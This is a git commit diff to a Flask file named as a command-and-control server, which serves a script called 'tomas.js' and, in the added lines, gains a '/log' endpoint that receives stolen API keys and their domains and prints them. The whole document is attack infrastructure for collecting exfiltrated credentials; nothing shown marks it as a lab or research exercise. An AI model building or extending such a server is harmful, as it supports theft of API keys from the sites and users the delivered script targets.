2d1819a1af7231f115b84aa3001a3049ac88bae4
emanuelepns <69849793+emanuelepns@users.noreply.github.com>
2026-05-15 21:38:18 +0200

    Updated C2 server to get the exfiltred key

--- c2-server/server.py
+++ c2-server/server.py
@@ -1,4 +1,4 @@
-from flask import Flask, send_from_directory
+from flask import Flask, send_from_directory, request
 import os
 
 app = Flask(__name__)
@@ -6,4 +6,12 @@ app = Flask(__name__)
 @app.route("/tomas.js")
 def serve_script():
     return send_from_directory(os.path.join(app.root_path, 'static'), 'tomas.js')
+
+@app.route("/log")
+def apikey_exfiltration():
+    key = request.args.get('key', 'NO_KEY')
+    domain = request.args.get('domain', 'NO_DOMAIN')
+
+    print("[RECEIVED KEY] Domain: ", domain, " | Key: ", key)
+    return "OK"
 
